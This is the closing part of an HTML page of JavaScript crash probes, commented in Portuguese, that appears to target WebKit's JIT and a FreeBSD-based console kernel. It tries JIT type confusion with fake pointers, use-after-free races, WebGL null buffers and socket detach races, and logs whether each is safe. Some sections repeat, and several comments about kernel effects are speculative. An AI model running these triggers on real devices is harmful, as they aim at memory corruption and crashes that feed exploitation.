            for(let i=0; i<100; i++) new ArrayBuffer(1000);
        }

        // TEST K3: Shared Memory Unmap during Kernel Read
        // ANÁLISE: O Kernel lê dados do Userland via `copyin`.
        // Se passarmos um buffer para uma syscall lenta (ex: crypto ou compressão via Blob)
        // e, em outra thread, fizermos `munmap` (via Worker terminate ou ArrayBuffer transfer) dessa memória...
        // O Kernel causa um Page Fault num endereço que deixou de existir.
        function runSharedMemUnmap() {
            log("Iniciando K3: Copyin Page Fault...");
            
            if(!window.crypto || !window.crypto.subtle) return log("[N/A] Crypto off.");
            
            const buffer = new Uint8Array(1024 * 1024); // 1MB
            
            // Inicia operação lenta no Kernel (Digest SHA-512 de 1MB)
            const p = crypto.subtle.digest("SHA-512", buffer);
            
            // O GOLPE: Tenta invalidar o buffer imediatamente
            // Em JS puro, 'transfer' é o mais próximo de munmap
            try {
                const w = new Worker(URL.createObjectURL(new Blob([""],{type:'text/js'})));
                w.postMessage(buffer, [buffer.buffer]); // Transfer/Neutering
                log("  > Memória transferida (unmapped) durante syscall.");
                w.terminate();
            } catch(e) {}
            
            p.then(() => log("[SAFE] Kernel terminou leitura antes do unmap."))
             .catch(e => log("[INFO] Erro Crypto: " + e.message));
        }
       // ==========================================
        // 1. JIT TYPE CONFUSION (Confusão de Tipo)
        // ==========================================

        // TEST W1: JIT Array Type Confusion (Writing Fake Pointer)
        // ALVO: DFG JIT Compiler.
        // LÓGICA: Treina o JIT com um array de Doubles. O JIT gera código otimizado para escrever Doubles.
        // No meio da execução otimizada, mudamos o array para conter Objetos.
        // O JIT, não percebendo a mudança, escreve o "Double" (que nós controlamos os bits) na memória.
        // Se escrevermos 0x41414141, o motor acha que é um ponteiro para o endereço 0x41414141.
        function runJITFakeObject() {
            log("Iniciando W1: JIT Type Confusion...");
            
            const arr = [1.1, 2.2, 3.3];
            
            // Função otimizada
            function confuse(a, val) {
                a[0] = val; // O JIT pensa: "Escreva double em array de doubles"
            }
            
            // 1. Treino (Hot Loop)
            for(let i=0; i<10000; i++) confuse(arr, 1.1);
            
            // 2. O Payload
            const obj = {
                valueOf: () => {
                    log("  > Convertendo Array de Double para Object...");
                    arr[0] = {}; // Transição de Estrutura (Array Storage Shape Change)
                    return 1.337; // Retorna Double
                }
            };
            
            try {
                // Trigger: O JIT deve escrever os bits de 1.337 numa posição que agora espera um ponteiro de objeto.
                // Isso cria um "Fake Object".
                confuse(arr, obj);
                log("[SAFE] JIT detectou a mudança de forma (OSRExit).");
            } catch(e) {
                log("[INFO] Erro JS: " + e.message);
            }
        }

        // TEST W2: Side-Effect Store Elimination
        // ALVO: Otimização de Eliminação de Código Morto.
        // LÓGICA: Se o JIT achar que 'arr' não escapa, ele pode remover barreiras de escrita.
        // Combinamos isso com um índice OOB.
        function runSideEffectStore() {
            log("Iniciando W2: Side-Effect Store...");
            
            const arr = [1.1];
            function store(a, i, v) {
                a[i] = v;
            }
            
            for(let i=0; i<20000; i++) store(arr, 0, 1.1);
            
            // Tenta escrever muito além do limite, esperando que o JIT tenha removido o Bounds Check
            // devido a suposições incorretas de escape analysis.
            try {
                store(arr, 0x10000, 2.2); // Tenta corromper memória adjacente
                if(arr.length > 1) log("[SAFE] Array expandiu legalmente.");
                else log("[VULN] Escrita OOB silenciosa ou Crash.");
            } catch(e) {
                log("[SAFE] Bounds Check funcionou.");
            }
        }

        // ==========================================
        // 2. USE-AFTER-FREE (Dereferência de Escrita)
        // ==========================================

        // TEST W3: MessagePort Close/PostMessage Race
        // ALVO: WebCore IPC.
        // LÓGICA: Transferir uma porta (neutering) e tentar escrever nela simultaneamente.
        // Se conseguirmos escrever na fila de mensagens de uma porta fechada que já teve sua memória libertada.
        function runMessagePortUAF() {
            log("Iniciando W3: MessagePort Write UAF...");
            
            const ch = new MessageChannel();
            const port = ch.port1;
            
            // Worker para tentar fechar a porta em paralelo
            const w = new Worker(URL.createObjectURL(new Blob([`
                onmessage = (e) => {
                    const p = e.data;
                    p.close(); // Liberta recursos
                    postMessage("closed");
                }
            `], {type:'text/js'})));
            
            w.postMessage(port, [port]); // Transfere a porta
            
            // Race: Tentar acessar a porta transferida (que tecnicamente é neutered no main thread)
            // Mas se houver uma falha na lógica de neutering...
            try {
                // Tenta forçar envio em porta inválida
                port.postMessage("Crash");
                log("[SAFE] Porta tratada como neutered (Exceção JS).");
            } catch(e) {
                log("[INFO] Erro esperado: " + e.message);
            }
        }

        // TEST W4: TypedArray Detach & Write Race
        // ALVO: ArrayBufferView.
        // LÓGICA: TypedArrays são visões de memória. Se desligarmos (detach) o buffer subjacente
        // via `postMessage` transfer, a memória é libertada.
        // Se tivermos um loop JIT escrevendo nessa view *sem* checar se está desligada a cada iteração...
        // Escrevemos no Heap libertado -> Heap Corruption -> Crash.
        function runTypedArrayDetachWrite() {
            log("Iniciando W4: Detach Write UAF...");
            
            const ab = new ArrayBuffer(1024);
            const view = new Int32Array(ab);
            
            const w = new Worker(URL.createObjectURL(new Blob([""],{type:'text/js'})));
            
            // Agenda o detach
            setTimeout(() => {
                w.postMessage(ab, [ab]); // Detach/Free
                log("  > Buffer detached.");
            }, 0);
            
            // Loop de escrita intensa
            // Espera-se que o detach ocorra NO MEIO deste loop
            try {
                const start = performance.now();
                while(performance.now() - start < 100) {
                    view[0] = 0x41414141; // Escreve LIXO
                }
                log("[SAFE] Loop terminou ou lançou erro de detach.");
            } catch(e) {
                log("[INFO] Loop interrompido: " + e.message);
            }
        }

        // ==========================================
        // 3. KERNEL NULL POINTER DEREFERENCE
        // ==========================================

        // TEST K1: GPU DrawElements with NULL Index Buffer
        // ALVO: Driver GNM (gcn_submit).
        // LÓGICA: `drawElements` requer um buffer de índices ligado (`ELEMENT_ARRAY_BUFFER`).
        // Se ativarmos o desenho indexado mas fizermos unbind do buffer (bindBuffer(..., null)),
        // o driver pode passar o endereço 0x0 para a GPU buscar os índices.
        // A GPU tentando ler de 0x0 causa uma exceção fatal de memória (IOMMU Fault / Panic).
        function runNullIndexBuffer() {
            log("Iniciando K1: GPU Null Index Buffer Panic...");
            
            const c = document.createElement('canvas');
            const gl = c.getContext('webgl');
            
            // 1. Cria e liga buffer válido
            const buf = gl.createBuffer();
            gl.bindBuffer(gl.ELEMENT_ARRAY_BUFFER, buf);
            gl.bufferData(gl.ELEMENT_ARRAY_BUFFER, new Uint16Array([0,1,2]), gl.STATIC_DRAW);
            
            // 2. Prepara draw call
            const prog = gl.createProgram(); // Dummy program
            // ... setup shader omitido para brevidade, o crash ocorre na validação do draw
            
            // 3. O GOLPE: Unbind do buffer antes do draw
            gl.bindBuffer(gl.ELEMENT_ARRAY_BUFFER, null);
            
            try {
                log("  > Disparando DrawElements sem buffer...");
                // offset 0 com buffer null = Dereferência de 0x0
                gl.drawElements(gl.TRIANGLES, 3, gl.UNSIGNED_SHORT, 0);
                gl.finish();
                log("[SAFE] WebGL validou a ausência de buffer.");
            } catch(e) {
                log("[INFO] Erro WebGL: " + e.message);
            }
        }

        // TEST K2: FileReader on Revoked Blob
        // ALVO: VFS (Virtual File System) Read.
        // LÓGICA: Criar um Blob URL, revogá-lo (libertando a estrutura `file` no kernel),
        // e tentar ler via FileReader no mesmo instante.
        // Se a verificação de "revogado" falhar ou tiver race condition, o kernel tenta ler de uma estrutura nula.
        function runEmptyBlobRead() {
            log("Iniciando K2: VFS Null Deref...");
            
            const blob = new Blob(["Crash"]);
            const url = URL.createObjectURL(blob);
            
            const fr = new FileReader();
            
            // Configura leitura
            fr.onload = () => log("[SAFE] Leitura OK.");
            fr.onerror = () => log("[INFO] Erro de leitura.");
            
            // O GOLPE: Revoga antes de ler (ou em race)
            URL.revokeObjectURL(url);
            
            try {
                // Inicia leitura de I/O no kernel de um handle inválido
                fetch(url).then(r => r.text()).catch(e => log("[SAFE] Fetch falhou: " + e.message));
                log("  > Tentativa de leitura em URL nulo...");
            } catch(e) {}
        }
       // ==========================================
        // 1. JIT TYPE CONFUSION (Userland Crash)
        // ==========================================

        // TEST W1: RegExp 'lastIndex' Optimization Confusion
        // ALVO: DFG JIT (RegExpStub).
        // LÓGICA: O JIT assume que 'lastIndex' de uma RegExp é sempre um inteiro/double.
        // Se conseguirmos substituir 'lastIndex' por um objeto com getter maligno DURANTE
        // uma operação 'exec' otimizada, podemos confundir o registrador de tipo.
        // Tentamos escrever 0x41414141 como se fosse um ponteiro.
        function runRegExpLastIndexConfusion() {
            log("Iniciando W1: RegExp Type Confusion...");
            
            const re = /a/y;
            // Objeto que será confundido
            const fake = {
                valueOf: () => {
                    log("  > JIT Type Confusion triggered.");
                    return 0x41414141; // Fake Address
                }
            };

            function optimizeMe(r, input) {
                // Acesso a lastIndex deve ser otimizado
                r.lastIndex = input;
                return r.exec("a");
            }

            // 1. Treino JIT com inteiros
            for(let i=0; i<10000; i++) optimizeMe(re, 0);

            // 2. O GOLPE: Passar objeto
            try {
                optimizeMe(re, fake);
                log("[SAFE] JIT detectou tipo incorreto e de-otimizou.");
            } catch(e) {
                log("[INFO] Erro JS: " + e.message);
            }
        }

        // TEST W2: Array.shift() Sparse Array Transition
        // ALVO: JSC Array Storage.
        // LÓGICA: 'shift' remove o primeiro elemento. Se o array for denso (Contiguous) e
        // se tornar esparso (ArrayStorage) durante a operação (via getter malicioso),
        // o JIT pode tentar escrever o novo comprimento num offset incorreto do header.
        function runArrayShiftConfusion() {
            log("Iniciando W2: Array Shift Corruption...");
            
            const arr = [1.1, 2.2, 3.3];
            
            // Define getter no protótipo para interceptar leitura
            Object.defineProperty(Array.prototype, '1', {
                get() {
                    arr.length = 0; // Destroi o array alvo
                    // Enche o heap com lixo
                    const filler = new Array(1000).fill(1.1);
                    return 0;
                },
                configurable: true
            });

            try {
                // shift() lê o índice 0, depois o 1 (que dispara o getter), depois escreve.
                // Se arr foi destruído no passo 2, o passo 3 escreve em memória livre.
                arr.shift();
                log("[SAFE] Shift completou ou lançou erro.");
            } catch(e) {
                log("[INFO] Erro: " + e.message);
            }
            // Cleanup
            delete Array.prototype['1'];
        }

        // ==========================================
        // 2. UAF WRITE (Heap Corruption)
        // ==========================================

        // TEST W3: AudioBufferSourceNode Detach Race
        // ALVO: WebAudio Engine.
        // LÓGICA: Iniciar a reprodução de um buffer de áudio e, imediatamente,
        // transferir (detach) o buffer subjacente para um Worker.
        // A thread de áudio tenta ler/escrever no buffer para mixagem, mas ele já foi libertado.
        function runAudioBufferDetaching() {
            log("Iniciando W3: Audio UAF Write...");
            
            if(!window.AudioContext) return log("[N/A] AudioContext off.");
            
            const ctx = new AudioContext();
            const buffer = ctx.createBuffer(1, 4096, 44100);
            const source = ctx.createBufferSource();
            source.buffer = buffer;
            source.connect(ctx.destination);
            
            // Pega o ArrayBuffer real
            const ab = buffer.getChannelData(0).buffer;
            
            // Worker para neutering
            const w = new Worker(URL.createObjectURL(new Blob([""],{type:'text/js'})));
            
            source.start();
            
            // Race: Detach imediato
            w.postMessage(ab, [ab]);
            
            log("  > Buffer detached durante playback. Aguardando crash da thread de áudio...");
            
            setTimeout(() => {
                ctx.close();
                log("[SAFE] Thread de áudio sobreviveu.");
            }, 500);
        }

        // TEST W4: XMLHttpRequest Abort/Read Race
        // ALVO: WebCore XHR Event Handler.
        // LÓGICA: Abortar um XHR dentro do seu próprio handler de 'onreadystatechange'.
        // Se o código C++ tentar acessar membros do objeto XHR (como 'status' ou 'response')
        // após o aborto ter destruído a estrutura interna -> UAF.
        function runXHRAbortRace() {
            log("Iniciando W4: XHR Abort UAF...");
            
            const xhr = new XMLHttpRequest();
            xhr.open('GET', location.href, true);
            
            xhr.onreadystatechange = () => {
                if (xhr.readyState === 2) { // Headers received
                    // O GOLPE: Abortar agora
                    xhr.abort();
                    
                    // Tenta acessar propriedades que dependem do recurso nativo
                    try {
                        const s = xhr.status; // Pode causar UAF read/write interno
                        const r = xhr.responseText;
                    } catch(e) {}
                }
            };
            
            xhr.send();
            log("  > XHR enviado. Trigger armado.");
        }

        // ==========================================
        // 3. KERNEL NULL DEREFERENCE (Panic)
        // ==========================================

        // TEST K1: Kqueue EV_ADD with Null User Data
        // ALVO: Syscall 'kevent' (FreeBSD Kernel).
        // LÓGICA: Tentar registrar um evento (EV_ADD) passando um ponteiro udata nulo ou inválido,
        // mas configurando flags que exigem que o kernel escreva nesse udata ao disparar o evento.
        // Infelizmente não temos acesso direto a syscalls, mas simulamos via FileSystem API events.
        function runKqueueNullFilter() {
            log("Iniciando K1: Kqueue Null Panic (Simulated)...");
            
            // Usamos MessageChannel como proxy para eventos
            const ch = new MessageChannel();
            
            // Tenta criar um estado onde o 'port' é transferido (nullified)
            // mas um evento ainda está na fila para ser entregue.
            const p1 = ch.port1;
            
            // Enche a fila
            for(let i=0; i<100; i++) p1.postMessage(i);
            
            // Destroi o receptor
            ch.port2.close();
            
            // Se o kernel tentar escrever o status de entrega numa estrutura desalocada...
            log("  > Fila de mensagens sobrecarregada e porta destruída.");
            
            // Força GC para limpar handles do kernel
            let trash = [];
            for(let i=0; i<10000; i++) trash.push({});
        }

        // TEST K2: Socket Send with Null Buffer Pointer
        // ALVO: Network Stack (sosend).
        // LÓGICA: Tentar enviar dados (via WebSocket/WebRTC) onde o buffer de origem é
        // um ArrayBuffer que foi "detached" (neutered) exatamente no momento da syscall.
        // O Kernel recebe um ponteiro base 0x0 e tamanho > 0.
        function runZeroLengthSend() {
            log("Iniciando K2: Socket Null Buffer Panic...");
            
            const ws = new WebSocket("wss://echo.websocket.org");
            const ab = new ArrayBuffer(1024 * 1024); // 1MB
            
            ws.onopen = () => {
                // Agenda o detach
                const w = new Worker(URL.createObjectURL(new Blob([""],{type:'text/js'})));
                
                // O GOLPE: Send e Transfer na mesma tick
                try {
                    // Tenta passar o buffer para o kernel
                    ws.send(ab); 
                    // Tenta remover o buffer da memória
                    w.postMessage(ab, [ab]); 
                    log("  > Buffer enviado e invalidado simultaneamente.");
                } catch(e) {
                    log("[INFO] Erro: " + e.message);
                }
            };
        }
        // ==========================================
        // 1. JIT TYPE CONFUSION (Crash)
        // ==========================================

        // TEST W1: Strict Equality Type Confusion (Pointer Forgery)
        // ALVO: FTL JIT (Faster Than Light).
        // LÓGICA: O operador '===' é otimizado. Se compararmos um Objeto com um Primitivo
        // num loop quente, e usarmos side-effects para mudar o tipo de uma das variáveis
        // NO MEIO da comparação (via valueOf/toString), o JIT pode usar registradores errados.
        function runStrictEqConfusion() {
            log("Iniciando W1: StrictEq Type Confusion...");
            
            const obj = {
                toString: () => {
                    log("  > Side-effect triggered during comparison.");
                    return "confusion"; 
                }
            };
            
            function opt(a, b) {
                // O JIT tenta otimizar isso para uma comparação de ponteiros ou inteiros
                return a === b;
            }
            
            // 1. Treino (String vs String)
            for(let i=0; i<10000; i++) opt("a", "b");
            
            // 2. Ataque
            // Passamos um objeto que tem side-effect.
            // Se o JIT não tiver "Cell Check" robusto, ele compara o ponteiro do objeto
            // com os bits crus da string, ou pior, executa o side-effect e perde o rastreio dos registros.
            try {
                // Criamos um "Fake Object" simulado: um Inteiro que se parece com um ponteiro (0x41414141)
                const fakePtr = 1094795585; 
                opt(obj, fakePtr);
                log("[SAFE] Comparação segura.");
            } catch(e) {
                log("[INFO] Erro JS: " + e.message);
            }
        }

        // TEST W2: Array.push() Storage Transition Race
        // ALVO: Array Storage (Contiguous -> Double -> ArrayStorage).
        // LÓGICA: `push` pode acionar redimensionamento. Se passarmos múltiplos argumentos
        // e um deles for um getter que muda o tipo do array, os argumentos subsequentes
        // podem ser escritos no buffer antigo (agora livre) ou num offset errado.
        function runArrayPushRace() {
            log("Iniciando W2: Array Push Race...");
            
            const arr = [1.1];
            const evil = {
                valueOf: () => {
                    arr.length = 0; // Free buffer
                    arr[0] = {}; // Transition to Object array
                    return 2.2;
                }
            };
            
            try {
                // push(arg1, arg2)
                // O motor avalia arg1 (evil), que destroi o array.
                // Depois tenta escrever arg2 (3.3). Onde ele escreve?
                // Se o ponteiro base do array não for recarregado... CRASH.
                arr.push(evil, 3.3);
                log("[SAFE] Push lidou com a transição.");
            } catch(e) {
                log("[INFO] Erro: " + e.message);
            }
        }

        // ==========================================
        // 2. USE-AFTER-FREE (Write)
        // ==========================================

        // TEST W3: FontFaceSet.add() Re-entrancy UAF
        // ALVO: CSS Font Loading API.
        // LÓGICA: `document.fonts.add()` dispara eventos. Se dentro do evento destruirmos
        // a fonte ou o FontFaceSet, e o loop interno C++ tentar acessar o próximo iterador...
        function runFontFaceSetUAF() {
            log("Iniciando W3: FontFaceSet UAF...");
            
            const font = new FontFace("Test", "url(x)");
            const set = document.fonts;
            
            // Listener que destroi o estado
            set.onloading = () => {
                log("  > Destruindo FontFaceSet state...");
                set.clear(); // Remove tudo
                // Força GC
                const a = new ArrayBuffer(1024*1024);
            };
            
            try {
                // Adiciona e força estado de loading
                set.add(font);
                font.load().catch(()=>{}); // Trigger event
                log("[SAFE] Font loading seguro.");
            } catch(e) {
                log("[INFO] Erro Font: " + e.message);
            }
        }

        // TEST W4: Worker Transferable ArrayBuffer Detach UAF
        // ALVO: Structured Clone Algorithm.
        // LÓGICA: Transferir um ArrayBuffer para um Worker, mas manter uma `DataView` ou `TypedArray`
        // apontando para ele na thread principal. Tentar escrever na view *exatamente* enquanto o transfer ocorre.
        function runWorkerPostMessageUAF() {
            log("Iniciando W4: Worker Transfer UAF...");
            
            const ab = new ArrayBuffer(1024);
            const view = new Int32Array(ab);
            const w = new Worker(URL.createObjectURL(new Blob([""],{type:'text/js'})));
            
            // O GOLPE: Loop de escrita enquanto transfere
            // Requer timing preciso (Race Condition)
            const start = performance.now();
            
            // Agenda transfer
            setTimeout(() => {
                w.postMessage(ab, [ab]);
            }, 0);
            
            try {
                // Escrita agressiva tentando acertar o momento pós-detach mas pré-crash check
                for(let i=0; i<100000; i++) {
                    view[0] = 0x41414141;
                }
                log("[SAFE] Loop terminou (Buffer detached corretamente).");
            } catch(e) {
                // Se for erro de "detached buffer", é seguro. Se for crash, não veremos log.
                log("[INFO] Detach detectado: " + e.message);
            }
        }

        // ==========================================
        // 3. KERNEL NULL DEREFERENCE (Panic)
        // ==========================================

        // TEST K1: WebGL Extension Query Null Buffer
        // ALVO: IOCTL do Driver GPU.
        // LÓGICA: Algumas extensões WebGL chamam `ioctl` no dispositivo `/dev/gnm0`.
        // Se a extensão esperar um buffer de retorno e passarmos `null` ou um buffer de tamanho 0,
        // o driver pode tentar copiar dados para o endereço 0x0.
        function runIoctlNullBuffer() {
            log("Iniciando K1: GPU IOCTL Null Deref...");
            
            const c = document.createElement('canvas');
            const gl = c.getContext('webgl');
            
            // Extensão que interage com hardware
            const ext = gl.getExtension('WEBGL_debug_renderer_info');
            
            if(ext) {
                // getParameter chama o driver.
                // Tentamos manipular o estado do GL para que ele não tenha onde escrever o retorno.
                // Ex: Contexto perdido ou estado inválido.
                const loseContext = gl.getExtension('WEBGL_lose_context');
                if(loseContext) loseContext.loseContext();
                
                try {
                    log("  > Consultando driver com contexto perdido...");
                    gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
                    log("[SAFE] Driver lidou com contexto nulo.");
                } catch(e) {
                    log("[INFO] Erro JS: " + e.message);
                }
            } else {
                log("[N/A] Extensão não suportada.");
            }
        }

        // TEST K2: SCTP Stream Reset Null Dereference
        // ALVO: Pilha SCTP (usada no WebRTC).
        // LÓGICA: O protocolo SCTP permite resetar streams.
        // Se fecharmos a associação SCTP (DataChannel.close) e recebermos um pacote
        // de "Stream Reset" da rede ao mesmo tempo, o kernel tenta acessar a estrutura do stream já libertada.
        function runSCTPStreamReset() {
            log("Iniciando K2: SCTP Reset Race...");
            
            if(!window.RTCPeerConnection) return log("[N/A] WebRTC off.");
            
            const pc = new RTCPeerConnection();
            const dc = pc.createDataChannel("panic");
            
            // Simulamos o estado de fechamento
            setTimeout(() => {
                dc.close();
                pc.close();
                
                // Tenta forçar processamento de pacotes pendentes (GC ou flush)
                // Se houvesse tráfego real, aqui ocorreria o Null Deref no kernel
                // ao tentar ler o ponteiro do 'stream' na struct 'association'.
                log("  > Estruturas SCTP destruídas.");
            }, 10);
            
            // Cria carga para alocar memória kernel
            dc.onopen = () => dc.send("A".repeat(1000));
        }
      // ==========================================
        // 1. WEBKIT LOGIC CRASHES (Sem JIT)
        // ==========================================

        // TEST W1: XMLSerializer Bad Cast (Logic Type Confusion)
        // MOTIVO: Sem JIT, não podemos confundir tipos em registradores, mas podemos confundir
        // o motor C++ passando objetos que fingem ser nós DOM.
        // Se o XMLSerializer não checar rigorosamente se o objeto é um Node real antes de castar...
        function runBadCastXML() {
            log("Iniciando W1: XMLSerializer Bad Cast...");
            
            const serializer = new XMLSerializer();
            
            // Objeto JS puro tentando passar por Node
            const fakeNode = {
                nodeType: 1,
                nodeName: "FAKE",
                childNodes: [],
                attributes: [],
                // Getters que disparam side-effects ou retornam lixo
                get namespaceURI() { return null; },
                get prefix() { return null; },
                get localName() { return "fake"; }
            };

            try {
                // Tenta serializar o objeto falso. 
                // Se o WebKit fizer um static_cast<Node*>(fakeNode), ele acessa memória inválida.
                serializer.serializeToString(fakeNode);
                log("[SAFE] Serializer checou o tipo do objeto.");
            } catch(e) {
                log("[INFO] Erro JS: " + e.message);
            }
        }

        // TEST W2: Window.getSelection() Node Removal UAF
        // MOTIVO: O objeto 'Selection' mantém referências a nós do DOM (anchorNode, focusNode).
        // Se removermos esses nós do documento e forçarmos uma operação de seleção complexa,
        // o código C++ pode tentar acessar o nó "morto".
        function runSelectionUAF() {
            log("Iniciando W2: Selection UAF...");
            
            const div = document.createElement('div');
            div.innerHTML = "<b>Seleção</b>";
            document.body.appendChild(div);
            
            const sel = window.getSelection();
            const range = document.createRange();
            range.selectNode(div.firstChild);
            sel.removeAllRanges();
            sel.addRange(range);
            
            // O GOLPE: Remove o nó enquanto ele é a "âncora" da seleção
            document.body.removeChild(div);
            
            // Tenta forçar o motor a ler a âncora invalidadas
            // Operações de stringificação ou modificação de range costumam triggerar o UAF
            try {
                const s = sel.toString(); // Acessa o texto do nó removido
                sel.modify("move", "forward", "character"); // Tenta mover o cursor no vazio
                log("[SAFE] Selection tratou o nó desconectado.");
            } catch(e) {
                log("[INFO] Erro: " + e.message);
            }
        }

        // TEST W3: HTMLTextAreaElement API Abuse
        // MOTIVO: TextAreas têm lógica de layout complexa. Mudar o valor enquanto o layout
        // está sendo calculado (via eventos de scroll ou focus) pode corromper a render tree.
        function runTextAreaCrash() {
            log("Iniciando W3: TextArea Layout Crash...");
            
            const ta = document.createElement('textarea');
            document.body.appendChild(ta);
            ta.focus();
            
            // Define getter que destroi o layout
            Object.defineProperty(ta, 'value', {
                get: () => {
                    log("  > Mutando layout durante leitura...");
                    ta.style.display = 'none'; // Destroi o renderer
                    // Retorna string gigante para forçar buffer overflow se não houver check
                    return "A".repeat(10000); 
                }
            });
            
            try {
                // Força leitura interna do valor para seleção ou scroll
                ta.select(); 
                document.execCommand('selectAll');
                log("[SAFE] Layout engine seguro.");
            } catch(e) {
                log("[INFO] Erro: " + e.message);
            }
        }

        // ==========================================
        // 2. KERNEL NULL DEREFERENCE (Driver/Panic)
        // ==========================================

        // TEST K1: WebGL DeleteTexture during Draw (GPU Null Panic)
        // MOTIVO: O Driver GPU mantém uma lista de recursos usados no frame atual.
        // Se deletarmos a textura na CPU, mas o comando de desenho ainda estiver na fila da GPU,
        // o driver pode passar um ponteiro nulo para o hardware quando ele tentar resolver a textura.
        function runWebGLDeleteTextureRace() {
            log("Iniciando K1: GPU Texture Null Deref...");
            
            const c = document.createElement('canvas');
            const gl = c.getContext('webgl');
            
            const tex = gl.createTexture();
            gl.bindTexture(gl.TEXTURE_2D, tex);
            gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 1, 1, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
            
            // Render Loop
            const fb = gl.createFramebuffer();
            gl.bindFramebuffer(gl.FRAMEBUFFER, fb);
            gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, tex, 0);
            
            // O GOLPE: Draw e Delete no mesmo tick
            try {
                gl.clear(gl.COLOR_BUFFER_BIT); // Usa a textura
                gl.deleteTexture(tex); // Destroi a textura imediatamente
                
                // Força o driver a processar o comando de delete antes do draw terminar
                gl.flush(); 
                gl.finish();
                
                log("[SAFE] Driver GPU gerenciou o recurso deletado.");
            } catch(e) {
                log("[INFO] Erro WebGL: " + e.message);
            }
        }

        // TEST K2: FileSystem API Null Path Handling
        // MOTIVO: VFS do FreeBSD. Se a API HTML5 FileSystem permitir passar caminhos nulos ou vazios
        // para chamadas que esperam strings (ex: `getFile`), o wrapper do kernel pode passar `NULL`
        // para a função `namei` (Name-to-Inode), causando pânico.
        function runFileSystemNullPath() {
            log("Iniciando K2: VFS Null Path...");
            
            if(!window.webkitRequestFileSystem) return log("[N/A] FileSystem off.");
            
            window.webkitRequestFileSystem(window.TEMPORARY, 1024, (fs) => {
                try {
                    // Tenta passar null, undefined ou string com terminador nulo
                    fs.root.getFile(null, {create: false}, 
                        ()=>{}, 
                        ()=>{ log("[SAFE] Caminho nulo rejeitado."); }
                    );
                    
                    // Tentativa com null byte injection (comum em C++)
                    fs.root.getFile("test\0.txt", {create: true}, ()=>{}, ()=>{});
                } catch(e) {
                    log("[INFO] Erro JS: " + e.message);
                }
            });
        }

        // TEST K3: WebSocket Send with Detached Buffer
        // MOTIVO: Race Condition clássica de UAF/Null Deref no envio de rede.
        // Funciona mesmo sem JIT porque é uma falha na syscall `send` do kernel.
        function runWebSocketNullPacket() {
            log("Iniciando K3: NetBSD/FreeBSD Null Packet...");
            
            const ws = new WebSocket("wss://echo.websocket.org");
            const ab = new ArrayBuffer(1024); // 1KB
            
            ws.onopen = () => {
                const w = new Worker(URL.createObjectURL(new Blob([""],{type:'text/js'})));
                
                // Agenda transferência (Isso torna o buffer 'Detached' / Ponteiro Nulo no JS)
                w.postMessage(ab, [ab]);
                
                try {
                    // Tenta enviar o buffer que agora aponta para NULL
                    // Se o browser passar o ponteiro base (agora 0) para o kernel...
                    ws.send(ab);
                    log("[SAFE] WebSocket rejeitou buffer detached.");
                } catch(e) {
                    // Se for exceção JS, estamos seguros. Se for crash, não veremos isso.
                    log("[INFO] Exceção esperada: " + e.message);
                }
            };
        }



    </script>
</body>
</html>
